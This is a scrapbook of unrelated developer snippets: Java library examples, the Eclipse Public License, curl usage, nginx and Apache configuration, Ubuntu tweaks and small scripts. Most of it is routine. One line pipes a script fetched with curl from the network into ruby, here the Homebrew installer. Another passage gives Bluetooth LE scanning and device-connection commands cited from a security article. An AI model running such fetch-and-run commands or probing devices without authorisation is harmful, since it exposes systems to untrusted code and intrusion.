    		<groupId>org.elasticsearch.client</groupId>
    		<artifactId>transport</artifactId>
    		<version>6.1.2</version>
		</dependency>
				<dependency>
    <groupId>org.elasticsearch.plugin</groupId>
    <artifactId>transport-netty4-client</artifactId>
    <version>6.1.2</version>
	</dependency>
	<dependency>
    <groupId>org.elasticsearch.plugin</groupId>
    <artifactId>reindex-client</artifactId>
    <version>6.1.2</version>
</dependency>
<dependency>
    <groupId>org.elasticsearch.plugin</groupId>
    <artifactId>lang-mustache-client</artifactId>
    <version>6.1.2</version>
</dependency>
<dependency>
    <groupId>org.elasticsearch.plugin</groupId>
    <artifactId>percolator-client</artifactId>
    <version>6.1.2</version>
</dependency>
<dependency>
    <groupId>org.elasticsearch.plugin</groupId>
    <artifactId>parent-join-client</artifactId>
    <version>6.1.2</version>
</dependency>
--------------------------------------------------------------------------------------------------------
public class BookJSONParser implements Parser<Book> {

    String filename;
    public BookJSONParser(String filename) {
        this.filename = filename;
    }

    @Override
    public void serialize(Book book) {
        Gson gson = new GsonBuilder().setPrettyPrinting().create();

        try {
            FileWriter writer = new FileWriter(filename);
            String json = gson.toJson(book);
            writer.write(json);
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public Book deserialize() {
        Gson gson = new Gson();

        try {
            BufferedReader br = new BufferedReader(
                    new FileReader(filename));

            JsonReader jsonReader = new JsonReader(br);
            Book book = gson.fromJson(jsonReader, Book.class);
            return book;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
}
--------------------------------------------------------------------------------------------------------
package com.javasampleapproach.java9flow.pubsub;
 
public class MainApp {
 
  public static void main(String[] args) throws InterruptedException {
    
    MyPublisher publisher = new MyPublisher();
    MySubscriber subscriberA = new MySubscriber("A");
    MySubscriber subscriberB = new MySubscriber("B");
    
    publisher.subscribe(subscriberA);
    publisher.subscribe(subscriberB);
    
    publisher.waitUntilTerminated();
  }
}

package com.javasampleapproach.java9flow.pubprocsub;
 
public class MainApp {
 
  public static void main(String[] args) throws InterruptedException {
    
    MyPublisher publisher = new MyPublisher();
    
    MySubscriber subscriber = new MySubscriber();
    subscriber.setDEMAND(...); // MUST set number of items to be requested here!
    
    MyProcessor processor = new MyProcessor();
    processor.setDEMAND(...); // MUST set number of items to be requested here!
    
    publisher.subscribe(processor);
    processor.subscribe(subscriber);
    
    publisher.waitUntilTerminated();
    
  }
}

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
 
public class MainApp {
 
  public static void main(String[] args) {
 
    final int MAX_BUFFER_CAPACITY = 128;
    final ExecutorService executor = Executors.newFixedThreadPool(4);
 
    MyPublisher publisher = new MyPublisher(executor, MAX_BUFFER_CAPACITY, 200, TimeUnit.MILLISECONDS);
    
    MySubscriber subscriberA = new MySubscriber("A");
    subscriberA.setDEMAND(3);
 
    MySubscriber subscriberB = new MySubscriber("B");
    subscriberB.setDEMAND(6);
 
    publisher.subscribe(subscriberA);
    publisher.subscribe(subscriberB);
  }
}
package com.javasampleapproach.java9flow.submissionpublisher;
 
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
 
public class MainApp {
 
  public static void main(String[] args) {
 
    final int MAX_BUFFER_CAPACITY = 128;
    final ExecutorService executor = Executors.newFixedThreadPool(4);
 
    MyPublisher publisher = new MyPublisher(executor, MAX_BUFFER_CAPACITY, 200, TimeUnit.MILLISECONDS);
 
    publisher.consume((data) -> process(data));
  }
 
  static void process(Integer i) {
    System.out.println("consume() testing: " + i.toString());
  }
}
--------------------------------------------------------------------------------------------------------
import org.yaml.snakeyaml.Yaml;

import java.io.IOException;
import java.io.InputStream;

public class LoadAsJavaObjectList {

    public static void main(String[] args) throws IOException {
        Yaml yaml = new Yaml();
        try (InputStream in = LoadAsJavaObject.class.getResourceAsStream("/persons.yml")) {
            Persons persons = yaml.loadAs(in, Persons.class);
            for (Person person : persons.getPersons()) {
                System.out.println(person);
            }
        }
    }
}
--------------------------------------------------------------------------------------------------------
 
import javax.naming.InitialContext;                                                                          
import javax.jms.Topic;
import javax.jms.Session;
import javax.jms.TextMessage;
import javax.jms.TopicPublisher;
import javax.jms.DeliveryMode;
import javax.jms.TopicSession;
import javax.jms.TopicConnection;
import javax.jms.TopicConnectionFactory;
                                                                            
public class Publisher
{
    public static void main(String[] args) throws Exception
    {
       // get the initial context
       InitialContext ctx = new InitialContext();
                                                                           
       // lookup the topic object
       Topic topic = (Topic) ctx.lookup("topic/topic0");
                                                                           
       // lookup the topic connection factory
       TopicConnectionFactory connFactory = (TopicConnectionFactory) ctx.
           lookup("topic/connectionFactory");
                                                                           
       // create a topic connection
       TopicConnection topicConn = connFactory.createTopicConnection();
                                                                           
       // create a topic session
       TopicSession topicSession = topicConn.createTopicSession(false,
           Session.AUTO_ACKNOWLEDGE);
                                                                           
       // create a topic publisher
       TopicPublisher topicPublisher = topicSession.createPublisher(topic);
       topicPublisher.setDeliveryMode(DeliveryMode.NON_PERSISTENT);
                                                                           
       // create the "Hello World" message
       TextMessage message = topicSession.createTextMessage();
       message.setText("Hello World");
                                                                           
       // publish the messages
       topicPublisher.publish(message);
                                                                           
       // print what we did
       System.out.println("Message published: " + message.getText());
                                                                           
       // close the topic connection
       topicConn.close();
    }
}
import javax.naming.InitialContext;                                                                          
import javax.jms.Topic;
import javax.jms.Session;
import javax.jms.TextMessage;
import javax.jms.TopicSession;
import javax.jms.TopicSubscriber;
import javax.jms.TopicConnection;
import javax.jms.TopicConnectionFactory;
                                                                            
public class Subscriber
{
    public static void main(String[] args) throws Exception
    {
       // get the initial context
       InitialContext ctx = new InitialContext();
                                                                           
       // lookup the topic object
       Topic topic = (Topic) ctx.lookup("topic/topic0");
                                                                           
       // lookup the topic connection factory
       TopicConnectionFactory connFactory = (TopicConnectionFactory) ctx.
           lookup("topic/connectionFactory");
                                                                           
       // create a topic connection
       TopicConnection topicConn = connFactory.createTopicConnection();
                                                                           
       // create a topic session
       TopicSession topicSession = topicConn.createTopicSession(false,
           Session.AUTO_ACKNOWLEDGE);
                                                                           
       // create a topic subscriber
       TopicSubscriber topicSubscriber = topicSession.createSubscriber(topic);
                                                                           
       // start the connection
       topicConn.start();
                                                                           
       // receive the message
       TextMessage message = (TextMessage) topicSubscriber.receive();
                                                                           
       // print the message
       System.out.println("Message received: " + message.getText());
                                                                           
       // close the topic connection
       topicConn.close();
    }
}

--------------------------------------------------------------------------------------------------------
check if single element is in a collection
1
2
3
	
List<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, hasItem("cd"));
assertThat(collection, not(hasItem("zz")));

check if multiple elements are in a collection
1
2
	
List<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, hasItems("cd", "ef"));

check all elements in a collection

– with strict order
1
2
	
List<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, contains("ab", "cd", "ef"));

– with any order
1
2
	
List<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, containsInAnyOrder("cd", "ab", "ef"));

check if collection is empty
1
2
	
List<String> collection = Lists.newArrayList();
assertThat(collection, empty());

check if array is empty
1
2
	
String[] array = new String[] { "ab" };
assertThat(array, not(emptyArray()));

check if Map is empty
1
2
	
Map<String, String> collection = Maps.newHashMap();
assertThat(collection, equalTo(Collections.EMPTY_MAP));

check if Iterable is empty
1
2
	
Iterable<String> collection = Lists.newArrayList();
assertThat(collection, emptyIterable());

check size of a collection
1
2
	
List<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, hasSize(3));

checking size of an iterable
1
2
	
Iterable<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, Matchers.<String> iterableWithSize(3));

check condition on every item
1
2
	
List<Integer> collection = Lists.newArrayList(15, 20, 25, 30);
assertThat(collection, everyItem(greaterThan(10)));
--------------------------------------------------------------------------------------------------------
    @Size(min = 5, message ="The name '${validatedValue}' must be at least {min}" +
                        " characters long. Length found : ${validatedValue.length()}")
    private String name;
	
     Validator validator = getValidator();
     validator.validate(testBean).stream().forEach(ValidatedValueExample::printError);
--------------------------------------------------------------------------------------------------------
sudo hcitool lescan

Подключение к BLE устройство через Mac адрес и получение списка служб и дескрипторов:

sudo gatttool -b YOUR_MAC -I -t random

Подробнее: https://www.securitylab.ru/analytics/499344.php
sudo hciconfig hci0 reset

Подробнее: https://www.securitylab.ru/analytics/499344.php
--------------------------------------------------------------------------------------------------------
	@Override
	public <C> C unwrap(Class<C> type) {
		// Keep backward compatibility
		if ( type.isAssignableFrom( ConstraintViolation.class ) ) {
			return type.cast( this );
		}
		if ( type.isAssignableFrom( HibernateConstraintViolation.class ) ) {
			return type.cast( this );
		}
		throw LOG.getTypeNotSupportedForUnwrappingException( type );
	}
--------------------------------------------------------------------------------------------------------
assertThat(strings, 
   allOf(
     iterableWithSize(greaterThan(2)),
     hasItem("string two")
   )
);
--------------------------------------------------------------------------------------------------------
    public static void main(String[] args) {

        try (InputStream input = App3.class.getClassLoader().getResourceAsStream("config.properties")) {

            Properties prop = new Properties();

            if (input == null) {
                System.out.println("Sorry, unable to find config.properties");
                return;
            }

            //load a properties file from class path, inside static method
            prop.load(input);

            //get the property value and print it out
            System.out.println(prop.getProperty("db.url"));
            System.out.println(prop.getProperty("db.user"));
            System.out.println(prop.getProperty("db.password"));

        } catch (IOException ex) {
            ex.printStackTrace();
        }

    }
--------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.dataformat.yaml.YAMLFactory;

import java.io.File;
import java.io.IOException;
import java.util.List;

public class LoadContacts {

  private static String yamlLocation = "path_to/../contacts.yml";

  public static void main(String[] args) throws IOException {
    ObjectMapper mapper = new ObjectMapper(new YAMLFactory());

    try {
      List<Contact> contactList = mapper.readValue(new File(yamlLocation), new TypeReference<List<Contact>>(){});
      contactList.forEach(System.out::println);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
--------------------------------------------------------------------------------------------------------
Eclipse Public License - v 2.0
==============================

THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE PUBLIC LICENSE (“AGREEMENT”). ANY USE, REPRODUCTION OR DISTRIBUTION OF THE PROGRAM CONSTITUTES RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT.

### 1. Definitions

“Contribution” means:
* **a)** in the case of the initial Contributor, the initial content Distributed under this Agreement, and
* **b)** in the case of each subsequent Contributor:
	* **i)** changes to the Program, and
	* **ii)** additions to the Program;
where such changes and/or additions to the Program originate from and are Distributed by that particular Contributor. A Contribution “originates” from a Contributor if it was added to the Program by such Contributor itself or anyone acting on such Contributor's behalf. Contributions do not include changes or additions to the Program that are not Modified Works.

“Contributor” means any person or entity that Distributes the Program.

“Licensed Patents” mean patent claims licensable by a Contributor which are necessarily infringed by the use or sale of its Contribution alone or when combined with the Program.

“Program” means the Contributions Distributed in accordance with this Agreement.

“Recipient” means anyone who receives the Program under this Agreement or any Secondary License (as applicable), including Contributors.

“Derivative Works” shall mean any work, whether in Source Code or other form, that is based on (or derived from) the Program and for which the editorial revisions, annotations, elaborations, or other modifications represent, as a whole, an original work of authorship.

“Modified Works” shall mean any work in Source Code or other form that results from an addition to, deletion from, or modification of the contents of the Program, including, for purposes of clarity any new file in Source Code form that contains any contents of the Program. Modified Works shall not include works that contain only declarations, interfaces, types, classes, structures, or files of the Program solely in each case in order to link to, bind by name, or subclass the Program or Modified Works thereof.

“Distribute” means the acts of **a)** distributing or **b)** making available in any manner that enables the transfer of a copy.

“Source Code” means the form of a Program preferred for making modifications, including but not limited to software source code, documentation source, and configuration files.

“Secondary License” means either the GNU General Public License, Version 2.0, or any later versions of that license, including any exceptions or additional permissions as identified by the initial Contributor.

### 2. Grant of Rights

**a)** Subject to the terms of this Agreement, each Contributor hereby grants Recipient a non-exclusive, worldwide, royalty-free copyright license to reproduce, prepare Derivative Works of, publicly display, publicly perform, Distribute and sublicense the Contribution of such Contributor, if any, and such Derivative Works.

**b)** Subject to the terms of this Agreement, each Contributor hereby grants Recipient a non-exclusive, worldwide, royalty-free patent license under Licensed Patents to make, use, sell, offer to sell, import and otherwise transfer the Contribution of such Contributor, if any, in Source Code or other form. This patent license shall apply to the combination of the Contribution and the Program if, at the time the Contribution is added by the Contributor, such addition of the Contribution causes such combination to be covered by the Licensed Patents. The patent license shall not apply to any other combinations which include the Contribution. No hardware per se is licensed hereunder.

**c)** Recipient understands that although each Contributor grants the licenses to its Contributions set forth herein, no assurances are provided by any Contributor that the Program does not infringe the patent or other intellectual property rights of any other entity. Each Contributor disclaims any liability to Recipient for claims brought by any other entity based on infringement of intellectual property rights or otherwise. As a condition to exercising the rights and licenses granted hereunder, each Recipient hereby assumes sole responsibility to secure any other intellectual property rights needed, if any. For example, if a third party patent license is required to allow Recipient to Distribute the Program, it is Recipient's responsibility to acquire that license before distributing the Program.

**d)** Each Contributor represents that to its knowledge it has sufficient copyright rights in its Contribution, if any, to grant the copyright license set forth in this Agreement.

**e)** Notwithstanding the terms of any Secondary License, no Contributor makes additional grants to any Recipient (other than those set forth in this Agreement) as a result of such Recipient's receipt of the Program under the terms of a Secondary License (if permitted under the terms of Section 3).

### 3. Requirements

**3.1** If a Contributor Distributes the Program in any form, then:

* **a)** the Program must also be made available as Source Code, in accordance with section 3.2, and the Contributor must accompany the Program with a statement that the Source Code for the Program is available under this Agreement, and informs Recipients how to obtain it in a reasonable manner on or through a medium customarily used for software exchange; and

* **b)** the Contributor may Distribute the Program under a license different than this Agreement, provided that such license:
	* **i)** effectively disclaims on behalf of all other Contributors all warranties and conditions, express and implied, including warranties or conditions of title and non-infringement, and implied warranties or conditions of merchantability and fitness for a particular purpose;
	* **ii)** effectively excludes on behalf of all other Contributors all liability for damages, including direct, indirect, special, incidental and consequential damages, such as lost profits;
	* **iii)** does not attempt to limit or alter the recipients' rights in the Source Code under section 3.2; and
	* **iv)** requires any subsequent distribution of the Program by any party to be under a license that satisfies the requirements of this section 3.

**3.2** When the Program is Distributed as Source Code:

* **a)** it must be made available under this Agreement, or if the Program **(i)** is combined with other material in a separate file or files made available under a Secondary License, and **(ii)** the initial Contributor attached to the Source Code the notice described in Exhibit A of this Agreement, then the Program may be made available under the terms of such Secondary Licenses, and
* **b)** a copy of this Agreement must be included with each copy of the Program.

**3.3** Contributors may not remove or alter any copyright, patent, trademark, attribution notices, disclaimers of warranty, or limitations of liability (“notices”) contained within the Program from any copy of the Program which they Distribute, provided that Contributors may add their own appropriate notices.

### 4. Commercial Distribution

Commercial distributors of software may accept certain responsibilities with respect to end users, business partners and the like. While this license is intended to facilitate the commercial use of the Program, the Contributor who includes the Program in a commercial product offering should do so in a manner which does not create potential liability for other Contributors. Therefore, if a Contributor includes the Program in a commercial product offering, such Contributor (“Commercial Contributor”) hereby agrees to defend and indemnify every other Contributor (“Indemnified Contributor”) against any losses, damages and costs (collectively “Losses”) arising from claims, lawsuits and other legal actions brought by a third party against the Indemnified Contributor to the extent caused by the acts or omissions of such Commercial Contributor in connection with its distribution of the Program in a commercial product offering. The obligations in this section do not apply to any claims or Losses relating to any actual or alleged intellectual property infringement. In order to qualify, an Indemnified Contributor must: **a)** promptly notify the Commercial Contributor in writing of such claim, and **b)** allow the Commercial Contributor to control, and cooperate with the Commercial Contributor in, the defense and any related settlement negotiations. The Indemnified Contributor may participate in any such claim at its own expense.

For example, a Contributor might include the Program in a commercial product offering, Product X. That Contributor is then a Commercial Contributor. If that Commercial Contributor then makes performance claims, or offers warranties related to Product X, those performance claims and warranties are such Commercial Contributor's responsibility alone. Under this section, the Commercial Contributor would have to defend claims against the other Contributors related to those performance claims and warranties, and if a court requires any other Contributor to pay any damages as a result, the Commercial Contributor must pay those damages.

### 5. No Warranty

EXCEPT AS EXPRESSLY SET FORTH IN THIS AGREEMENT, AND TO THE EXTENT PERMITTED BY APPLICABLE LAW, THE PROGRAM IS PROVIDED ON AN “AS IS” BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, EITHER EXPRESS OR IMPLIED INCLUDING, WITHOUT LIMITATION, ANY WARRANTIES OR CONDITIONS OF TITLE, NON-INFRINGEMENT, MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE. Each Recipient is solely responsible for determining the appropriateness of using and distributing the Program and assumes all risks associated with its exercise of rights under this Agreement, including but not limited to the risks and costs of program errors, compliance with applicable laws, damage to or loss of data, programs or equipment, and unavailability or interruption of operations.

### 6. Disclaimer of Liability

EXCEPT AS EXPRESSLY SET FORTH IN THIS AGREEMENT, AND TO THE EXTENT PERMITTED BY APPLICABLE LAW, NEITHER RECIPIENT NOR ANY CONTRIBUTORS SHALL HAVE ANY LIABILITY FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING WITHOUT LIMITATION LOST PROFITS), HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OR DISTRIBUTION OF THE PROGRAM OR THE EXERCISE OF ANY RIGHTS GRANTED HEREUNDER, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.

### 7. General

If any provision of this Agreement is invalid or unenforceable under applicable law, it shall not affect the validity or enforceability of the remainder of the terms of this Agreement, and without further action by the parties hereto, such provision shall be reformed to the minimum extent necessary to make such provision valid and enforceable.

If Recipient institutes patent litigation against any entity (including a cross-claim or counterclaim in a lawsuit) alleging that the Program itself (excluding combinations of the Program with other software or hardware) infringes such Recipient's patent(s), then such Recipient's rights granted under Section 2(b) shall terminate as of the date such litigation is filed.

All Recipient's rights under this Agreement shall terminate if it fails to comply with any of the material terms or conditions of this Agreement and does not cure such failure in a reasonable period of time after becoming aware of such noncompliance. If all Recipient's rights under this Agreement terminate, Recipient agrees to cease use and distribution of the Program as soon as reasonably practicable. However, Recipient's obligations under this Agreement and any licenses granted by Recipient relating to the Program shall continue and survive.

Everyone is permitted to copy and distribute copies of this Agreement, but in order to avoid inconsistency the Agreement is copyrighted and may only be modified in the following manner. The Agreement Steward reserves the right to publish new versions (including revisions) of this Agreement from time to time. No one other than the Agreement Steward has the right to modify this Agreement. The Eclipse Foundation is the initial Agreement Steward. The Eclipse Foundation may assign the responsibility to serve as the Agreement Steward to a suitable separate entity. Each new version of the Agreement will be given a distinguishing version number. The Program (including Contributions) may always be Distributed subject to the version of the Agreement under which it was received. In addition, after a new version of the Agreement is published, Contributor may elect to Distribute the Program (including its Contributions) under the new version.

Except as expressly stated in Sections 2(a) and 2(b) above, Recipient receives no rights or licenses to the intellectual property of any Contributor under this Agreement, whether expressly, by implication, estoppel or otherwise. All rights in the Program not expressly granted under this Agreement are reserved. Nothing in this Agreement is intended to be enforceable by any entity that is not a Contributor or Recipient. No third-party beneficiary rights are created under this Agreement.

#### Exhibit A - Form of Secondary Licenses Notice

> “This Source Code may also be made available under the following Secondary Licenses when the conditions for such availability set forth in the Eclipse Public License, v. 2.0 are satisfied: {name license(s), version(s), and exceptions or additional permissions here}.”

Simply including a copy of this Agreement, including this Exhibit A is not sufficient to license the Source Code under Secondary Licenses.

If it is not possible or desirable to put the notice in a particular file, then You may include the notice in a location (such as a LICENSE file in a relevant directory) where a recipient would be likely to look for such a notice.

You may add additional accurate notices of copyright ownership.

--------------------------------------------------------------------------------------------------------
curl -I https://www.keycdn.com/
curl -o myfile.css https://cdn.keycdn.com/css/animate.min.css
curl -O https://cdn.keycdn.com/css/animate.min.css
curl -H "X-Header: Value" https://www.keycdn.com/
curl -H "X-Header: Value" https://www.keycdn.com/ -v
curl -C - -O https://cdn.keycdn.com/img/cdn-stats.png
curl -D - https://www.keycdn.com/
curl -D - https://www.keycdn.com/ -o /dev/null
curl --limit-rate 200K -O https://cdn.keycdn.com/img/cdn-stats.png
curl -I --http2 https://cdn.keycdn.com/
curl -r 0-20000 -o myfile.png https://cdn.keycdn.com/img/cdn-stats.png
curl --request GET https://www.keycdn.com/
curl -X POST http://www.yourwebsite.com/login/ -d 'username=yourusername&password=yourpassword'
--------------------------------------------------------------------------------------------------------
vi /lightdm/lightdm.conf
allow-guest=false

service lightdm restart
--------------------------------------------------------------------------------------------------------
vi /etc/default/grub
GRUB_RECORDFAIL_TIMEOUT=0

update-grub
--------------------------------------------------------------------------------------------------------
ifconfig | grep inet6
If that produced no output then ipv6 is already disabled. Otherwise first open (as root) the file /etc/modprobe.d/aliases and locate the following line:

alias net-pf-10 ipv6
and replace it with

alias net-pf-10 off
Then open /etc/modprobe.d/blacklist and add the following at the end of the file:

# disable ipv6
blacklist ipv6
Next you'll have to reboot the system since that seems to be the only way to get already loaded ipv6 modules out of memory.

It should be noted that editing only /etc/modprobe.d/blacklist has the same end result of getting ipv6 disabled but a log entry like

modprobe: WARNING: Not loading blacklisted module ipv6
will get added every time something in the system tries to access the net using ipv6. That can happen often in a busy system so there's no point filling log files with it.
--------------------------------------------------------------------------------------------------------
The purpose of this page is to describe how UTF-8 can be disable in Ubuntu / Debian console. At least Ubuntu releases starting from Dapper have UTF-8 enabled by default after a clean install has been done. Checking the current status is simple:

$ echo $LANG
en_US.UTF-8
If the result is anything else than en_US.UTF-8 then UTF-8 shouldn't be enabled and there's no point in reading the rest of this page unless generating locales is the point of interest.

Check /etc/default/locale and /etc/environment as root (so that you can edit it). One of these files will contain line similar to these, LANG is the one you are searching for:

LANG="en_US.UTF-8"
LANGUAGE="en_FI:en"
The LANGUAGE setting depends of what you have selected during the beginning of the install process and usually doesn't nee to be changed. Remove UTF-8 from the LANG setting so that after editing that line will look like:

LANG="en_US"
Save the changes and close the file. Remember to check both files!

Next it's time to generate some new locales because en_US doesn't probably exist yet. Open /var/lib/locales/supported.d/local and if will look like:

en_US.UTF-8 UTF-8
and make it look like:

en_US ISO-8859-1
en_US.UTF-8 UTF-8
Also any other locale that needs to be generated should be added to that file. For example Finnish users might want to have fi_FI ISO-8859-1 in there too. Remeber to save the file after editing.

Now it's time to generate those new locales. As usual, run the following as root.

$ locale-gen
Generating locales...
...
Generation complete.
local-gen will list all locales included in /var/lib/locales/supported.d/local and generate those if necessary. Finally just log out and back in again. UTF-8 should now be disable. That can be checked in the same way we started:

$ echo $LANG
en_US
Ubuntu 12.04 (and possibly also Debian) appendix
(status as of 5.8.2012)
A change done in January 2012 that was introduced in Ubuntu 12.04 causes the file .pam_environment to be created to the user home directory usually when logging in X. The content of that file is created from /etc/default/locale but .UTF-8 is forced after each entry even if the original didn't contain such. This results UTF-8 getting forced even if it has been disabled in /etc/default/locale. The easiest way to fix this is to edit (as root) /usr/share/language-tools/save-to-pam-env and add the following before “exit 0” near the end of the file:

sed -i -e 's:\.UTF-8::g' "$homedir/.pam_environment"
Log out and back in again. Now the .pam_environment shouldn't anymore contain traces of UTF-8.
--------------------------------------------------------------------------------------------------------
#!/bin/bash
 
if [ $# -eq "1" ]; then
        beep -f 3000 -l 50
        for (( ; ; )) ; do
                pin=`ping -c 1 -w 1 "$1" | grep -c "bytes from"`
                if [ $pin -eq 1 ]; then
                        beep -f 3000 -l 50
                        echo "* `date +%H:%M:%S` online!"
                else
                        echo "`date +%H:%M:%S` timeout"
                fi
                sleep 2
        done
else
        echo "Target parameter missing!"
fi
--------------------------------------------------------------------------------------------------------
#!/usr/bin/env python
 
import xml.etree.ElementTree as ET
doc = ET.parse('valgrind.xml')
errors = doc.findall('//error')
 
out = open("cpputest_valgrind.xml","w")
out.write('<?xml version="1.0" encoding="UTF-8"?>\n')
out.write('<testsuite name="valgrind" tests="'+str(len(errors))+'" errors="0" failures="'+str(len(errors))+'" skip="0">\n')
errorcount=0
for error in errors:
    errorcount=errorcount+1
 
    kind = error.find('kind')
    what = error.find('what')
    if  what == None:
        what = error.find('xwhat/text')
 
    stack = error.find('stack')
    frames = stack.findall('frame')
 
    for frame in frames:
        fi = frame.find('file')
        li = frame.find('line')
        if fi != None and li != None:
            break
 
    if fi != None and li != None:
        out.write('    <testcase classname="ValgrindMemoryCheck" name="Memory check '+str(errorcount)+' ('+kind.text+', '+fi.text+':'+li.text+')" time="0">\n')
    else:
        out.write('    <testcase classname="ValgrindMemoryCheck" name="Memory check '+str(errorcount)+' ('+kind.text+')" time="0">\n')
    out.write('        <error type="'+kind.text+'">\n')
    out.write('  '+what.text+'\n\n')
 
    for frame in frames:
        ip = frame.find('ip')
        fn = frame.find('fn')
        fi = frame.find('file')
        li = frame.find('line')
        bodytext = fn.text
        bodytext = bodytext.replace("&","&amp;")
        bodytext = bodytext.replace("<","&lt;")
        bodytext = bodytext.replace(">","&gt;")
        if fi != None and li != None:
            out.write('  '+ip.text+': '+bodytext+' ('+fi.text+':'+li.text+')\n')
        else:
            out.write('  '+ip.text+': '+bodytext+'\n')
 
    out.write('        </error>\n')
    out.write('    </testcase>\n')
out.write('</testsuite>\n')
out.close()
--------------------------------------------------------------------------------------------------------
npm install moment

var moment = require('moment');
moment().format();
--------------------------------------------------------------------------------------------------------
Header unset Etag
FileETag none

FileETag INode MTime Size
--------------------------------------------------------------------------------------------------------
/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
brew install ffmpeg
ffmpeg -i input.mp4 -profile:v baseline -level 3.0 -s 640x360 -start_number 0 -hls_time 10 -hls_list_size 0 -f hls index.m3u8
--------------------------------------------------------------------------------------------------------
add_header Content-Security-Policy-Report-Only: "default-src 'none'; script-src http://wordpress.keycdn.net";
Header set Content-Security-Policy-Report-Only "default-src 'none'; script-src http://wordpress.keycdn.net;"
<system.webServer>
  <httpProtocol>
    <customHeaders>
      <add name="Content-Security-Policy" value="default-src 'self';" />
    </customHeaders>
  </httpProtocol>
</system.webServer>
--------------------------------------------------------------------------------------------------------
http {
    include /etc/nginx/mime.types;
    charset UTF-8;
    ...
}

AddType 'text/html; charset=UTF-8' html

<meta http-equiv="content-type" content="text/html;charset=UTF-8">
--------------------------------------------------------------------------------------------------------
sudo vi /etc/php5/fpm/php.ini
cgi.fix_pathinfo=0
sudo service php5-fpm restart

server {
    listen 80;
    server_name www.old-website.com;
    return 301 $scheme://www.new-website.com$request_uri;
}

server {
    ...
    rewrite ^(/download/.*)/media/(.*)\..*$ $1/mp3/$2.mp3 last;
    rewrite ^(/download/.*)/audio/(.*)\..*$ $1/mp3/$2.ra last;
    return 403;
    ...
}

if ($http_user_agent ~ MSIE) {
    rewrite ^(.*)$ /msie/$1 break;
}

if ($http_cookie ~* "id=([^;]+)(?:;|$)") {
    set $id $1;
}

if ($request_method = POST) {
    return 405;
}

if ($invalid_referer) {
    return 403;
}
--------------------------------------------------------------------------------------------------------
RewriteCond %{HTTP_HOST} example.com
RewriteRule (.*) http://www.example.com$1

server {
    listen 80;
    server_name example.com;
    return 301 http://www.example.com$request_uri;
}

server {
    listen 80;
    server_name www.example.com;
    # ...
}

location ~ \.php$ {
    if ($http_x_pull ~* "secretkeyname") {
        return 405;
    }
    fastcgi_split_path_info ^(.+\.php)(/.+)$;
    fastcgi_pass unix:/var/run/php5-fpm.sock;
    fastcgi_index index.php;
    include fastcgi_params;
}

RewriteEngine On
RewriteCond %{HTTP:X-Pull} secretkeyname
RewriteRule \.(html|php)$ - [F]

vi nginx.conf
server {
    listen 80 default_server;
    # Define the document root of the server e.g /var/www/html
    root /var/www/html;

    location /nginx_status {
        # Enable Nginx stats
        stub_status on;
        # Only allow access from your IP e.g 1.1.1.1 or localhost #
        allow 127.0.0.1;
        allow 1.1.1.1
        # Other request should be denied
        deny all;
    }
}

<IfModule mod_deflate.c>
    AddOutputFilterByType DEFLATE application/javascript
    AddOutputFilterByType DEFLATE application/rss+xml
    AddOutputFilterByType DEFLATE application/vnd.ms-fontobject
    AddOutputFilterByType DEFLATE application/x-font
    AddOutputFilterByType DEFLATE application/x-font-opentype
    AddOutputFilterByType DEFLATE application/x-font-otf
    AddOutputFilterByType DEFLATE application/x-font-truetype
    AddOutputFilterByType DEFLATE application/x-font-ttf
    AddOutputFilterByType DEFLATE application/x-javascript
    AddOutputFilterByType DEFLATE application/xhtml+xml
    AddOutputFilterByType DEFLATE application/xml
    AddOutputFilterByType DEFLATE font/opentype
    AddOutputFilterByType DEFLATE font/otf
    AddOutputFilterByType DEFLATE font/ttf
    AddOutputFilterByType DEFLATE image/svg+xml
    AddOutputFilterByType DEFLATE image/x-icon
    AddOutputFilterByType DEFLATE text/css
    AddOutputFilterByType DEFLATE text/javascript
    AddOutputFilterByType DEFLATE text/plain
    AddOutputFilterByType DEFLATE text/xml
</IfModule>

gzip on;
gzip_disable "msie6";
gzip_vary on;
gzip_proxied any;
gzip_comp_level 6;
gzip_buffers 16 8k;
gzip_http_version 1.1;
gzip_types application/javascript application/rss+xml application/vnd.ms-fontobject application/x-font application/x-font-opentype application/x-font-otf application/x-font-truetype application/x-font-ttf application/x-javascript application/xhtml+xml application/xml font/opentype font/otf font/ttf image/svg+xml image/x-icon text/css text/javascript text/plain text/xml;
--------------------------------------------------------------------------------------------------------
location ~* \.(png|jpg|jpeg|gif)$ {
    expires 365d;
    add_header Cache-Control "public, no-transform";
}

location ~* \.(js|css|pdf|html|swf)$ {
    expires 30d;
    add_header Cache-Control "public, no-transform";
}

<filesMatch ".(ico|pdf|flv|jpg|jpeg|png|gif|js|css|swf)$">
    Header set Cache-Control "max-age=2592000, public"
</filesMatch>

## EXPIRES CACHING ##
<IfModule mod_expires.c>
    ExpiresActive On
    ExpiresByType image/jpg "access 1 year"
    ExpiresByType image/jpeg "access 1 year"
    ExpiresByType image/gif "access 1 year"
